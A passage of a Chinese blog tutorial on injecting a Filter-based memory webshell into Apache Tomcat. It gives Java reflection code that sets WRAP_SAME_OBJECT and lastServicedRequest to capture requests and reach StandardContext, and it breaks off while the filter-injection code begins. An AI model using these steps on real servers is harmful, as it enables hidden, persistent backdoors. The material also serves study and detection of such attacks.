<code>FilterDefs</code>只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；</p><p>&#x3D;&#x3D;<code>FilterMaps</code>&#x3D;&#x3D;，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；</p><p>&#x3D;&#x3D;<code>FilterChain</code>&#x3D;&#x3D;是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p><h4 id="FilterChain创建"><a href="#FilterChain创建" class="headerlink" title="FilterChain创建"></a>FilterChain创建</h4><p>FilterChain创建由StandardWrapperValve创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724004559.png" alt="image.png"></p><p>跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724005632.png" alt="image.png"></p><p>可以看见首先是<code>context.findFilterMaps()</code>找到context中已经存在的<code>FilterMaps</code>, 再遍历<code>FilterMaps</code>, 由<code>FilterMap</code>在已存在的filterConfigs中找到具体的<code>filterConfig</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010043.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010115.png" alt="image.png"></p><p>由于Filter是&#x3D;&#x3D;动态创建&#x3D;&#x3D;的, 要打入内存马的话, 理论上反射修改这两个map就可以了</p><p>对于FilterMap, StandardContext提供了两个方法来直接添加</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010715.png" alt="image.png"><br>看上层接口注释, 其中<code>addFilterMapBefore</code>可以将FilterMap放在第一位<br>需要注意的是, 这两个方法都要经过<code>validateFilterMap</code>的验证, 主要是验证是否存在对应的<code>FilterDef</code>, 所以还要反射修改对应的<code>filterDefs</code></p><h4 id="内存马构造"><a href="#内存马构造" class="headerlink" title="内存马构造"></a>内存马构造</h4><h5 id="获取-StandardContext对象"><a href="#获取-StandardContext对象" class="headerlink" title="获取 StandardContext对象"></a>获取 <code>StandardContext</code>对象</h5><p>想要修改&#x3D;&#x3D;<code>StandardContext</code>&#x3D;&#x3D;中的&#x3D;&#x3D;<code>FilterMap</code>, <code>FilterDefs</code>, <code>FilterConfigs</code>&#x3D;&#x3D;, 就必须先拿到当前的<code>StandardContext</code>, 假如有这样一个反序列化入口, 我们想拿到<code>StandardContext</code>, 大部分文章都是从request入手<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215414.png" alt="image.png"></p><p>request对象上层接口可以获取当前session<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215733.png" alt="image.png"><br>而session的上层接口定义了它可以获取ServletContext<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215837.png" alt="image.png"></p><p>当然这只是一层接口, 实际上拿到的类有没有实现这几个接口, 返回的对象具体是什么类型, 还得去调试看看</p><p>可以看见<br>我们真正拿到的类是一个<code>RequestFacade</code> 这是[[Facade模式]]运用, </p><p>其目的是屏蔽tomcat核心接口(例如直接动态得插入filter等), 只暴露允许用户操作的接口</p><p>直接转到类中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231413.png" alt="image.png"></p><p><code>RequestFacade</code>是<code>HttpServletRequest</code>的实现类, <code>HttpServletRequest</code>是<code>ServletRequest</code>的实现类<br><code>RequestFacade</code>实现了<code>getServletContext()</code>方法, 返回了一个<code>ServletContext</code>,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231800.png" alt="image.png"><br>具体返回的是什么类, 也得调试看一下<br>写个demo看一下,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233413.png" alt="image.png"></p><p>拿到的其实是<code>org.apache.catalina.core.ApplicationContextFacade</code>, 依旧是[[Facade模式]]的Facade<br>找到这个类, 看一下结构有一个<code>ApplicationContext</code>类型的属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233112.png" alt="image.png"><br>再深入<code>ApplicationContext</code>里存着<code>StandardContext</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233152.png" alt="image.png"></p><p>梳理一下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726004757.png" alt="image.png"></p><p>这样确实能拿到StandardContext, 但是实际打内存马的时候是类加载, 从哪去找这个RequestFacade对象?</p><h6 id="通过lastServicedRequest"><a href="#通过lastServicedRequest" class="headerlink" title="通过lastServicedRequest"></a>通过<code>lastServicedRequest</code></h6><blockquote><p>为了<strong>在 filter&#x2F;servlet 执行期间，允许某些外部工具（如 JMX 或调试器）访问当前请求对象</strong>。Tomcat 把 <code>lastServicedRequest</code>&#x2F;<code>Response</code> 放在 <code>ApplicationFilterChain</code> 类中<br>    —来自ai解释</p></blockquote><p>当<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true时, 这里是会放进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010004.png" alt="image.png"><br>这是两个静态属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010252.png" alt="image.png"><br>也就是说可以直接访问到, 因此直接反射修改即可, 但是需要注意的是, 修改<code>WRAP_SAME_OBJECT</code>为true后, 下一次请求才会把request和respone保存进去, 所以想打进去内存马就得发两次请求,<br>第一次请求&#x3D;&#x3D;设置<code>WRAP_SAME_OBJECT</code>为true并为<code>lastServicedRequest</code> <code>lastServicedResponse</code>这两个静态变量赋值&#x3D;&#x3D;,<br>第二次请求&#x3D;&#x3D;触发<code>lastServicedRequest.set(request);</code>并拿到request&#x3D;&#x3D;</p><p>并且如果<code>WRAP_SAME_OBJECT</code>为true一直为true的话,  <code>lastServicedRequest</code>是会被置空的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729163709.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次请求后顺利拿到<code>RequestFacade</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729171612.png" alt="image.png"></p><p>进一步拿到StandardContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729173924.png" alt="image.png"><br>可以看见这里获取的就是我们的StandardContext</p><h6 id="通过Thread"><a href="#通过Thread" class="headerlink" title="通过Thread"></a>通过Thread</h6><p>pass</p><p>接下来就是去修改 <code>FilterDef</code>, <code>FilterConfigs</code>, <code>FilterMaps</code><br>这块主要还是靠自己边看边这几个类的结构边写代码, 我的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;  </span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span 